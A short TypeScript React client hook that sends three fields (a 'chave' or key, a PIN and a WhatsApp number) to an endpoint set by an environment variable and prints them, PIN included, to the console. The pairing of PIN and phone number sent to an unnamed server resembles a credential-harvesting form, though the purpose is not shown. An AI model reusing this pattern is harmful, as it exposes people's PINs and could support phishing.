'use client'

import 'dotenv/config'

interface formProps {
    chave: string,
    pin: string
}

export function useForm() {

    const setValues = (chave: string, pin: string, whatsapp: string) => {
        const formData = {
            chave,
            pin,
            whatsapp
        }

        const url = process.env.URL || ""

        async function submitForm(data: formProps) {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });

            console.table(formData)
        }

        submitForm(formData)
    }

    return { setValues }
}